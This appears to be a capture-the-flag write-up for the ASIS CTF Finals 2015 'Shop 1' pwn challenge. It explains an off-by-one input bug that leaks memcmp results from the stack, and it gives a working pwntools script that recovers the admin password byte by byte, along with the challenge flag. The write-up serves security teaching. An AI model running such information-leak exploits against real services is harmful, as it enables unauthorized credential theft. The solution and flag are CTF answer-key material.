---
title: "ASIS CTF Finals 2015 - Shop 1 (Pwn)"
header:
  overlay_image: /assets/images/asisfinals2015/shop1/header.png
  overlay_filter: 0.5
tags:
  - asisfinals2015
  - writeup
  - pwn
---

An off-by-one error allows an attacker to leak return codes from `memcmp` to
determine the difference in the supplied byte and the compared byte to leak the
flag byte by byte.

## Challenge Description

#### Points

100

#### Solves

34

#### Description

```
Our marvelous Bragisdumus shop just opened. Come and see our beautiful
Bragisdumus!

Login as an admin! get the admin password.

nc 185.106.120.220 1337
```

## Solution

On untarring the tarball, we get two files:

```shell
$ tar xvf bragisdumu-shop_349e3e948bc6b9794e2a7e28b979964e.tar.xz
bragisdumu-shop/
bragisdumu-shop/bragisdumu-shop
bragisdumu-shop/libc-2.19.so
$ file *
bragisdumu-shop: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=9dcbe489923351533513230b356baa91c997c73a, stripped
libc-2.19.so:    ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), BuildID[sha1]=30c94dc66a1fe95180c3d68d2b89e576d5ae213c, for GNU/Linux 2.6.24, stripped
```

An elf binary and the libc shared object the server is using. Let's run the
program:

```shell
$ ./bragisdumu-shop
The Official Bragisdumus Shop
  (guest password: guest)

Username: guest
Password: guest

Logged in as guest

Menu:
  1) list bragisdumus
  2) order a bragisdumu
  3) view my order
  4) add new bragisdumu (admin only)
  5) remove bragisdumu (admin only)
  8) logout
  9) exit
Choose: 9
```

If we look at the disassembly, there is also actually an admin account. The
password is stored in an adminpass.txt.

![1]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/shop1/1.png){: .align-center}

```shell
$ echo -n password > adminpass.txt
$ ./bragisdumu-shop
The Official Bragisdumus Shop
  (guest password: guest)

Username: admin
Password: blah
Unknown username or password!

Username: admin
Password: password

Logged in as admin

Menu:
  1) list bragisdumus
  2) order a bragisdumu
  3) view my order
  4) add new bragisdumu (admin only)
  5) remove bragisdumu (admin only)
  8) logout
  9) exit
Choose:
```

Now, the objective of this challenge is to log in as admin. So there must be
some sort of information leak vulnerability to exploit in order to retrieve the
password. There is a problem with the input reading here:

![2]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/shop1/2.png){: .align-center}

In fact, there is a subtle off by one error in our `read_input` function (names
mine). This means that we can chop off the null byte at the end of the buffer
holding the username and the buffer holding the password. Now, if we do some
dynamic analysis, we can take a look at memory just right after the comparison
takes place.

![3]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/shop1/3.png){: .align-center}

Now, notice that the return value of memcmp is negative. This means that the
first character that didn't match is lexicographically smaller. Now, we can use
our off by one vulnerability from above to leak this value. What we need to do
is trigger the write of the memcmp value to $rbp-0x10 first, then login with
guest with the off-by-one overwrite.

An illustration:

![4]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/shop1/4.png){: .align-center}

As you can observe, there is some leakage of the stack at the end. The first
four bytes leaked is our return value from memcmp. We can exploit this by
choosing a fixed character to test and then adding the negation of the return
code to get that character in that position!

Here is our exploit script:

```python
from pwn import *
import ctypes
#context.log_level = "debug"

def main():
    #shop = process("./bragisdumu-shop")
    shop = remote("185.106.120.220", 1337)
    known = ""
    while True:
        send_admin(shop, known)
        result = send_guest(shop)
        if "admin" in result:
            break
        offset = parse_guest(shop, result)
        found = chr(33 + (-1*offset))
        print "Found character: %s" % found
        known += found
        logout(shop)
    print "Here's the flag: %s" % known

def send_admin(shop, known):
    shop.sendline("admin")
    shop.sendline(known + "!")

def send_guest(shop):
    shop.sendline("guestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    shop.sendline("guestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    return shop.recvline_startswith("Logged in as")

def parse_guest(shop, data):
    interesting = data[109:109+4]
    return ctypes.c_int32(u32(interesting)).value

def logout(shop):
    shop.sendline("8")

if __name__ == "__main__":
    main()
```

Running the script:

```shell
$ python exploit.py
[+] Opening connection to 185.106.120.220 on port 1337: Done
Found character: A
Found character: S
Found character: I
Found character: S
Found character: {
Found character: 3
Found character: 0
Found character: 4
Found character: b
Found character: 0
Found character: f
Found character: 1
Found character: 6
Found character: e
Found character: b
Found character: 4
Found character: 3
Found character: 0
Found character: 3
Found character: 9
Found character: 1
Found character: c
Found character: 6
Found character: c
Found character: 8
Found character: 6
Found character: a
Found character: b
Found character: 0
Found character: f
Found character: 3
Found character: 2
Found character: 9
Found character: 4
Found character: 2
Found character: 1
Found character: 1
Found character: }
Here's the flag: ASIS{304b0f16eb430391c6c86ab0f3294211}
[*] Closed connection to 185.106.120.220 port 1337
```

Flag: **ASIS{304b0f16eb430391c6c86ab0f3294211}**
